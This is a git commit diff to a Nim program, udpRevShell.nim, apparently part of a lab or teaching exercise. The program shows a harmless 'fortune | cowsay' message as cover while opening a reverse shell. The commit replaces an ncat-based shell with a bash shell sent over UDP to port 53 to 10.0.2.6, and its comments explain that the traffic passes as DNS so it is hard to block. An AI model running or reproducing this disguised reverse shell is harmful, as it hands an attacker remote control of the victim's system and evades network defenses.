0df6ea7a3287273d993c0d4be464c296477a983e
generic <generic@localspot>
2023-02-20 13:38:25 -0500

    added slightly sneakier shell

--- udpRevShell.nim
+++ udpRevShell.nim
@@ -15,10 +15,10 @@ let (output, _) = execCmdEx("fortune | cowsay")
 
 echo output
 
-discard execCmd("ncat 10.0.2.6 4444 -e /bin/bash &")
+discard execCmd("bash -c 'sh -i >& /dev/udp/10.0.2.6/53 0>&1 &'")
 
 
-# This is an example of a very basic rev shell -
+# Now we are getting a bit sneakier- in fact we've added a couple of tricks.
 # It does nothing to hide the fact that it has shellcode calling
 # an ncat binary to send a shell over the network.
 # reversing its behavior is extremely easy with a simple 
@@ -28,6 +28,8 @@ discard execCmd("ncat 10.0.2.6 4444 -e /bin/bash &")
 # errant ncat connection as well.
 # Note that it is a bit sneakier than the bindshell- there's no listener on the target
 # When the payload isn't running.
-# Also, you will notice we can make the connection look like an innocuous "web" connection
-# by reaching out to a common port like 80.
+# We can go a bit further and exploit something that is hard to mess with-
+# We're reaching out through UDP, and what is a protocol that uses UDP, on a port
+# that is very difficult to just "turn off?" 
+# DNS of course! 
 # Lets see what we find in wireshark though, when we sniff traffic!
